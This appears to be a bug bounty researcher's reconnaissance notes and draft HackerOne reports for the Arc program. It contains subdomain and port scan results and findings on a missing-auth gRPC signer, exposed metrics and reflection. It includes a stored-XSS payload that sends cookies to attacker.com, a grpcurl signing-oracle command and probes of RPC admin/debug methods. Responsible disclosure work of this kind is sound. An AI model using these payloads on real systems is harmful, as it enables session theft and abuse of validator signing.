# 🛡️ Arc Bug Bounty Program — Reconnaissance & Report Documentation
**Program:** Arc Bug Bounty Program (arc-bbp) — HackerOne  
**Researcher:** prasanth_selva  
**Date:** September 21, 2026  
**Target:** arc.io (Circle Internet Contract Services, LLC)  

---

## 1. Program Overview

| Field | Value |
|-------|-------|
| **Response Efficiency** | 100% |
| **Avg. Time to First Response** | 4 hours |
| **Avg. Time to Triage** | 4 hours |
| **Avg. Time to Bounty** | 1 day, 23 hours |
| **Avg. Time to Resolution** | 2 days, 10 hours |
| **Total Bounties Paid** | $1,050 |
| **Average Bounty** | $500 |
| **Top Bounty** | $500 |

---

## 2. Scope Summary

| Asset | Type | Max Severity | Bounty | Tier |
|-------|------|-------------|--------|------|
| `rpc.testnet.arc.network` | Domain | Critical | Eligible | A |
| `rpc.drpc.testnet.arc.network` | Domain | Critical | Eligible | A |
| `github.com/circlefin/malachite` | Source Code | Critical | Eligible | A |
| `github.com/circlefin/arc-remote-signer` | Source Code | Critical | Eligible | A |
| `github.com/circlefin/arc-node` | Source Code | Critical | Eligible | A |
| `*.arc.io` | Wildcard | Critical | Eligible | B |

---

## 3. Reward Structure

### Tier A — Arc Mainnet Chain/Protocol

| Criticality | Reward |
|-------------|--------|
| Extreme | Up to $1,000,000 |
| Critical | $20,000 – $200,000 |
| High | $10,000 – $20,000 |
| Medium | $5,000 – $10,000 |
| Low | Up to $5,000 |

### Tier B — Arc Product / Web 2 (*.arc.io)

| Criticality | Reward |
|-------------|--------|
| Critical | $3,000 – $10,000 |
| High | $800 – $3,000 |
| Medium | $400 – $800 |
| Low | Up to $400 |

---

## 4. Reconnaissance Results (Hexstrike MCP)

### 4.1 Subdomain Enumeration (subfinder) — 56 subdomains

HIGH VALUE TARGETS:
- portal.arc.io          (Main user portal)
- account.arc.io         (Account management)
- agentvm.arc.io         (AI Agent VM)
- eaas.arc.io            (Execution-as-a-Service)
- studio.arc.io          (Developer Studio)
- onramp.arc.io          (Fiat on-ramp)

IN-SCOPE RPC:
- rpc.testnet.arc.io
- rpc.drpc.testnet.arc.io
- rpc.drpc.testnet.arc.network

STAGING (potential misconfigs):
- portal-staging.arc.io
- portal-staging-testnet.arc.io
- onramp-staging.arc.io
- onramp-demo-staging.arc.io
- onramp-demo-sandbox.arc.io
- staging.arc.io
- chat-staging.arc.io

### 4.2 Port Scan — rpc.testnet.arc.network (104.18.31.61)

```
PORT       STATE     SERVICE
80/tcp     open      Cloudflare HTTP proxy
443/tcp    open      Cloudflare HTTPS proxy
8080/tcp   open      Cloudflare HTTP proxy
8545/tcp   filtered  (EVM JSON-RPC — filtered)
9090/tcp   filtered  (gRPC — filtered)
26657/tcp  filtered  (CometBFT RPC — filtered)
26660/tcp  filtered  (Cosmos metrics — filtered)
```

### 4.3 Port Scan — portal.arc.io (104.18.21.97)

```
PORT      STATE  SERVICE
80/tcp    open   Cloudflare HTTP
443/tcp   open   Cloudflare HTTPS
8080/tcp  open   Cloudflare HTTP
```

### 4.4 URL Discovery (GAU) — Key Endpoints

```
https://portal.arc.io/
https://account.arc.io
https://agentvm.arc.io
https://eaas.arc.io
https://rpc.mainnet.arc.io/
https://rpc.testnet.arc.io/
https://docs.arc.io/arc/references/rpc-endpoints
https://docs.arc.io/arc/references/contract-addresses.md
https://docs.arc.io/ai/mcp
https://docs.arc.io/arc/tutorials/register-your-first-ai-agent
https://docs.arc.io/integrate/relayers-and-paymasters/deploy-a-paymaster
https://docs.arc.io/integrate/relayers-and-paymasters/eip-3009-relayer
```

---

## 5. Vulnerability Report Templates

---

### TEMPLATE 1 — HackerOne Ready Report: Missing Authentication in arc-remote-signer gRPC Server

**Asset:** https://github.com/circlefin/arc-remote-signer  
**Weakness:** CWE-306 — Missing Authentication for Critical Function  
**Severity:** Critical  
**Impact:** Critical chain / validator-signing security issue; unauthenticated signing oracle on a security-sensitive RPC.

```text
## Summary:
The public gRPC server exposed by the `arc-remote-signer` component lacks any form of application-level or transport-level authentication. The `SignerService.Sign` RPC on port `10340` can be invoked by any unauthenticated client with network access, allowing an attacker to submit arbitrary payloads for the Nitro Enclave to sign.

This completely bypasses the intended security model where only authorized validators or internal services should be allowed to request signatures.

## Steps To Reproduce:
1. Observe that `configs/app.yaml` exposes the public gRPC server on `0.0.0.0:10340` with TLS disabled by default.
2. Observe that even when TLS is enabled (`public.server.tls.enabled = true`), the `WithTLS` function in `internal/common/grpc/server/option.go` only creates server-side TLS credentials and never enforces mutual TLS by requiring and verifying a client certificate (`RequireAndVerifyClientCert`).
3. Observe that the `Sign` method in `internal/app/service/signer/signer.go` does not inspect any caller identity, token, metadata, or interceptor context before signing the supplied message.
4. A remote attacker with access to the service port can send an arbitrary signing request without any authentication:

   ```bash
   PAYLOAD=$(echo -n "malicious_transaction_data" | base64)

   grpcurl -plaintext -d "{\"message\": \"$PAYLOAD\"}" \
     TARGET_IP:10340 arc.signer.v1.SignerService/Sign
   ```

5. The service processes the request, forwards it to the Nitro Enclave, and returns a valid signature for the supplied payload.

## Supporting Material/References:
* `configs/app.yaml` — public server bound to `0.0.0.0` and TLS disabled by default.
* `internal/common/grpc/server/option.go` — `WithTLS` uses `credentials.NewServerTLSFromFile` but does not enforce client cert verification.
* `internal/app/service/signer/signer.go` — `Sign` performs no auth/authorization checks before calling `s.enclavePvd.SignMessage`.
* CWE-306: Missing Authentication for Critical Function (https://cwe.mitre.org/data/definitions/306.html)
* CWE-288: Authentication Bypass Using an Alternate Path or Channel (https://cwe.mitre.org/data/definitions/288.html)

## Impact:
An attacker exploiting this vulnerability could:
- act as an open oracle and obtain signatures for arbitrary messages on behalf of the validator signing key;
- submit slashable offenses or invalid validator messages to the Arc network;
- disrupt consensus or operational integrity without needing to extract the private key from the Nitro Enclave;
- trigger a validator-critical signing action from any unauthenticated network client with access to the port.

This is a direct authentication bypass on a security-sensitive function and represents a critical risk to validator integrity and network operations.
```

---

## 6. Additional Distinct Findings (Not Duplicates of the Auth Bypass)

### FINDING A — Unauthenticated Prometheus Metrics Exposure on the Public Host

**Asset:** https://github.com/circlefin/arc-remote-signer  
**Weakness:** CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor / CWE-284 — Improper Access Control  
**Severity:** Medium (Tier A or B depending on deployment exposure)  
**Impact:** Information disclosure and reconnaissance on validator infrastructure.

```text
## Summary:
The application exposes an optional Prometheus metrics HTTP endpoint on the public host when `metrics.prometheus.enabled` is set to true. The default configuration initializes the endpoint as `0.0.0.0:9090` and creates an HTTP server without any authentication or access control.

This means that if metrics are enabled in production or staging, any caller able to reach the host can scrape internal runtime telemetry, service metadata, request counts, gRPC method health, and process-level artifacts without authentication.

## Steps To Reproduce:
1. Observe that the Prometheus config defaults to `0.0.0.0:9090` and is initialized as a network listener in `internal/common/metric/config.go`.
2. Observe that `internal/app/metrics/server.go` starts an HTTP server on `net.Listen("tcp", addr)` and serves the registry through `promhttp.HandlerFor(...)`.
3. Observe that `internal/app/app.go` creates and manages the metrics HTTP server when `metricsCfg.IsPrometheusEnabled()` is true.
4. Enable the metrics endpoint and connect to the host on port `9090` without any auth token or mTLS requirement.
5. Fetch `/metrics` and observe the runtime and gRPC application telemetry exposure.

## Supporting Material/References:
* `internal/common/metric/config.go` — default Prometheus host is `0.0.0.0` and endpoint is enabled via config.
* `internal/app/metrics/server.go` — HTTP server is created with `net.Listen("tcp", addr)` and no authentication layer.
* `internal/app/app.go` — manages the metrics server when enabled.
* `configs/app.yaml` — metrics section defines the Prometheus endpoint bindings.

## Impact:
This allows unauthorized users to enumerate internal operational data, including service health, request patterns, and runtime process metrics. In a validator environment, this can simplify reconnaissance and downstream attacks by exposing timing, topology, and system behavior without requiring direct compromise of the signer API.
```

### FINDING B — gRPC Reflection Exposes the Full Service Contract on the Public Port

**Asset:** https://github.com/circlefin/arc-remote-signer  
**Weakness:** CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor / CWE-284 — Improper Access Control  
**Severity:** Medium  
**Impact:** Service enumeration and reconnaissance enabling more precise exploitation.

```text
## Summary:
The public gRPC service registers reflection with `reflection.Register(grpcSrv)` in `internal/app/public/public.go`. This exposes the full protobuf service description to any unauthenticated client that can reach the public port.

The result is a clear information disclosure and enumeration path: attackers can discover the exact RPCs, request/response schemas, and service names without any authentication, which significantly reduces the effort needed to abuse the signing endpoint or craft targeted requests.

## Steps To Reproduce:
1. Observe that the public infrastructure creates the grpc server and then calls `reflection.Register(grpcSrv)` in `internal/app/public/public.go`.
2. Connect to the public gRPC port without auth.
3. Use a reflection-aware client or gRPC descriptor client to enumerate services and methods.
4. Confirm that the full service contract for `SignerService` and related RPCs is exposed.

## Supporting Material/References:
* `internal/app/public/public.go` — `reflection.Register(grpcSrv)` is enabled on the public server.
* `internal/common/grpc/server/server.go` — the shared gRPC server is created without a service-level authentication interceptor.
* `internal/app/service/signer/signer.go` — the methods and request structure are clearly exposed and callable.

## Impact:
Attackers can enumerate the RPC surface and learn the exact request semantics before attacking the open signing endpoint. This makes subsequent abuse faster and more reliable while also exposing internal service contracts that should not be public on an unauthenticated network-facing listener.
```

---

### TEMPLATE 2 — Portal IDOR / Authorization Bypass

**Asset:** *.arc.io (portal.arc.io)  
**Weakness:** CWE-639 — IDOR  
**Severity:** High (Tier B — $800–$3,000)

```
## Summary:
Insecure Direct Object Reference (IDOR) in portal.arc.io allows 
authenticated users to access or modify resources belonging to other 
accounts by manipulating object identifiers in API requests.

## Steps To Reproduce:
1. Create two test accounts (Account A and Account B) on portal.arc.io
2. Log into Account A, intercept API requests with Burp Suite
3. Identify calls with user identifiers: /api/v1/accounts/{id}
4. Modify identifier to reference Account B's resources
5. Confirm unauthorized access to Account B data/actions

## Supporting Material/References:
* [Burp Suite capture of original request]
* [Modified request showing IDOR]
* [Response confirming unauthorized data access]

## Impact:
Attacker accesses sensitive financial data, transaction history, or wallet 
information of other portal users. In a financial platform handling USDC 
this represents a significant privacy and financial risk.
```

---

### TEMPLATE 3 — Stored XSS in Portal

**Asset:** *.arc.io  
**Weakness:** CWE-79 — Stored XSS  
**Severity:** Medium (Tier B — $400–$800)

```
## Summary:
Stored Cross-Site Scripting (XSS) in [specific input field] on *.arc.io 
allows injection of malicious JavaScript executing in other users' browsers.

## Steps To Reproduce:
1. Navigate to [vulnerable page] on [subdomain].arc.io
2. Locate input field: [field name]
3. Input payload: <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
4. Submit/save the form
5. Have a second user visit the page
6. Observe the payload executes, exfiltrating session cookies

## Supporting Material/References:
* [Screenshot of payload input]
* [Screenshot of payload execution in victim browser]
* [Network capture showing exfiltrated data]

## Impact:
Session hijacking, account takeover, or exfiltration of sensitive data 
from other Arc portal users.
```

---

### TEMPLATE 4 — RPC Endpoint Sensitive Method Exposure

**Asset:** rpc.testnet.arc.network  
**Weakness:** CWE-284 — Improper Access Control  
**Severity:** High (Tier A — $10,000–$20,000)

```
## Summary:
The Arc testnet RPC endpoint exposes sensitive JSON-RPC methods that 
should be restricted, including administrative or debug methods.

## Steps To Reproduce:
1. Connect to https://rpc.testnet.arc.network
2. Probe for exposed methods:
   curl -X POST https://rpc.testnet.arc.network \
     -H "Content-Type: application/json" \
     -d '{"jsonrpc":"2.0","method":"rpc_modules","params":[],"id":1}'
3. Test debug methods: debug_traceTransaction, debug_traceBlock
4. Test admin methods: admin_addPeer, admin_nodeInfo
5. Document any sensitive methods returning data

## Supporting Material/References:
* [curl output showing exposed methods]
* [Screenshots of sensitive data returned]

## Impact:
Exposure of debug/admin RPC methods could allow transaction manipulation, 
node administration abuse, or information disclosure. Similar misconfigurations 
on mainnet would have critical financial impact.
```

---

## 6. Testing Methodology Checklist

### Phase 1: Reconnaissance ✅ COMPLETED (Hexstrike MCP)
- [x] Subfinder subdomain enumeration (56 subdomains)
- [x] Nmap port scan (rpc.testnet.arc.network + portal.arc.io)
- [x] GAU URL discovery (200+ endpoints)
- [x] AI vulnerability assessment (attack surface: 7.5/10)
- [x] Bug bounty vulnerability hunting workflow

### Phase 2: Manual Testing (IN PROGRESS)
- [ ] portal.arc.io — Auth flow analysis
- [ ] portal.arc.io — API endpoint enumeration
- [ ] portal.arc.io — IDOR on account/wallet endpoints
- [ ] account.arc.io — Account takeover vectors
- [ ] agentvm.arc.io — Agent wallet security review
- [ ] eaas.arc.io — Execution endpoint review
- [ ] Staging environments — Misconfig/debug info checks

### Phase 3: Source Code Review
- [ ] arc-remote-signer — CWE-288 auth bypass analysis
- [ ] arc-remote-signer — Key material protection review
- [ ] malachite — BFT consensus safety logic
- [ ] arc-node — P2P, mempool, state management

### Phase 4: RPC Testing (Testnet Only)
- [ ] rpc.testnet.arc.network — JSON-RPC method enumeration
- [ ] rpc.drpc.testnet.arc.network — Proxy analysis
- [ ] EVM eth_* method testing
- [ ] CometBFT RPC probing

---

## 7. Out-of-Scope Quick Reference

| Excluded Finding | Reason |
|-----------------|--------|
| Clickjacking (no sensitive action) | Program rule |
| CSRF on unauthenticated forms | Program rule |
| Missing HttpOnly/Secure flags | Program rule |
| Missing SPF/DKIM/DMARC | Program rule |
| Software version disclosure | Program rule |
| CSV injection (no PoC) | Program rule |
| Rate limiting (non-auth) | Program rule |
| Self-XSS | HackerOne core |
| Open redirect (no extra impact) | Program rule |
| Tabnabbing | Program rule |
| Missing HTTPS/SSL best practices | Program rule |

---

## 8. Submission Checklist

Before submitting any report:
- [ ] Tested ONLY on Arc testnet — NOT mainnet
- [ ] Used own test accounts only
- [ ] Report written in English
- [ ] One vulnerability per report (unless chained for impact)
- [ ] Detailed reproduction steps included
- [ ] PoC shows impact without exploiting production data
- [ ] Screenshots/logs attached
- [ ] Severity correctly mapped to Tier A or Tier B
- [ ] Not a duplicate of existing report

---

## File Naming Convention
`YYYY-MM-DD_[SEVERITY]_[VULN_TYPE]_[TARGET].md`

Example: `2026-09-21_HIGH_IDOR_portal-arc-io.md`

---
*Last updated: September 21, 2026 | Researcher: prasanth_selva | Program: arc-bbp*
